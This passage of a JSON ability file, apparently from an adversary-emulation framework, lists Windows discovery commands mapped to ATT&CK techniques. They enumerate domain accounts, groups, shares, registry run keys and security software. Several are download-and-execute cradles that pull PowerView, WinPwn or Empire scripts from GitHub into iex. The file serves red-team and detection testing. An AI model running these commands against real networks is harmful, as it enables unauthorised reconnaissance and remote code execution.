        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4712f45e41760276d20885bbc885a2ef",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f5ddcd02f3b0fc9f42914c50751dec73": {
        "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1012",
            "name": "Query Registry"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" && reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5ddcd02f3b0fc9f42914c50751dec73",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8a80d00e72746abfaa90f97d4a2ad1a5": {
        "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "query user /SERVER:%COMPUTERNAME%",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8a80d00e72746abfaa90f97d4a2ad1a5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "63ed5204799ba94651caf93d718b4e8b": {
        "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "63ed5204799ba94651caf93d718b4e8b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "83338280b42be3f496b7aa102e2460c4": {
        "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd $env:temp; .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain $env:TEMP\\username.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "83338280b42be3f496b7aa102e2460c4",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "196263c4c1f42138866d958193ad2ad4": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "196263c4c1f42138866d958193ad2ad4",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e7d023dfcc77f4b701b6cdce79e9c3c2": {
        "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "hostname",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e7d023dfcc77f4b701b6cdce79e9c3c2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c58ba91431b9d73d726ccdd7d030a694": {
        "description": "General privesc checks using the otherchecks function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c58ba91431b9d73d726ccdd7d030a694",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9daa94a5038f6fcb8060b832623b8899": {
        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "netsh.exe advfirewall  show allprofiles && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9daa94a5038f6fcb8060b832623b8899",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "71b3d2945679566b9d94d8cb11df4b70": {
        "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "netsh advfirewall firewall show rule name=all",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "71b3d2945679566b9d94d8cb11df4b70",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f7a0f7d704aa52a764d9d1bee81e65d6": {
        "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1217",
            "name": "Browser Bookmark Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "where /R C:\\Users\\ places.sqlite",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f7a0f7d704aa52a764d9d1bee81e65d6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "cfcf66cc85109ad2ebdb301d619fa41f": {
        "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cfcf66cc85109ad2ebdb301d619fa41f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e29316e4fd973db867b0115db7d5f0c8": {
        "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; PathToAtomicsFolder\\T1049\\bin\\SharpView.exe $syntax -}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e29316e4fd973db867b0115db7d5f0c8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "98c8abc9362d5a3da76d23980572b5e2": {
        "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "98c8abc9362d5a3da76d23980572b5e2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "84a93e5157b690ee0f585cd55c15b0cb": {
        "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "84a93e5157b690ee0f585cd55c15b0cb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "613dc87cebac339d20973268e0bb1c0b": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "613dc87cebac339d20973268e0bb1c0b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d8fedd81fc35099a5a3f1a8f5d2082dd": {
        "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net group \"Domain Computers\" /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d8fedd81fc35099a5a3f1a8f5d2082dd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c333d7d59cf97a6353cbd5af72703780": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -f (objectcategory=person)",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c333d7d59cf97a6353cbd5af72703780",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a9faa0d792d6bc2660b05e7650d2736d": {
        "description": "Gathers local system information using the Morerecon function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a9faa0d792d6bc2660b05e7650d2736d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "64818f9563bd722bd6ed5075f5b0ef25": {
        "description": "Scan ports to check for listening ports with python\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "python 53b103_T1046.py -i 127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "53b103_T1046.py"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "64818f9563bd722bd6ed5075f5b0ef25",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "56d6dc2628d8f8c7ceec54f8641d21bf": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -f (objectcategory=subnet)",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "56d6dc2628d8f8c7ceec54f8641d21bf",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c84a57391dbc724dc51436deb3e0ca00": {
        "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c84a57391dbc724dc51436deb3e0ca00",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "69bbe2183fa09c00ccaac62d48e214f8": {
        "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1217",
            "name": "Browser Bookmark Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "dir /s /b %USERPROFILE%\\Favorites",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "69bbe2183fa09c00ccaac62d48e214f8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8ed60dceb98746f1da6214f4f6af7164": {
        "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-NetTCPConnection",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ed60dceb98746f1da6214f4f6af7164",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f32d25602b6c142d321b9a0965316916": {
        "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-AdComputer -Filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f32d25602b6c142d321b9a0965316916",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d7f1270ba66d5947a1422f7d5b1a36ef": {
        "description": "Network share enumeration using the shareenumeration function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d7f1270ba66d5947a1422f7d5b1a36ef",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "38714562d32f33dc32bd7aef553771d9": {
        "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "38714562d32f33dc32bd7aef553771d9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "beafe61e6874eb9eec2119bd12255193": {
        "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "beafe61e6874eb9eec2119bd12255193",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "014eab58c76b4ae9c82debd5c36885f7": {
        "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "nmap 127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "014eab58c76b4ae9c82debd5c36885f7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4b325a29e936cd1ccac2292bc92a31b5": {
        "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4b325a29e936cd1ccac2292bc92a31b5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a02c1389fc991a46cea0f76ab23fc096": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -f (objectcategory=organizationalUnit)",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "a02c1389fc991a46cea0f76ab23fc096",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b45cb08e24877077d98421393bce079a": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b45cb08e24877077d98421393bce079a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f49eb1d60594139d1331dcbbfe7f029d": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -f (objectcategory=computer)",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f49eb1d60594139d1331dcbbfe7f029d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b5310f535aaffec42f1902adf1b1270b": {
        "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b5310f535aaffec42f1902adf1b1270b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "254a86c31338f406082b3c10ba35713d": {
        "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
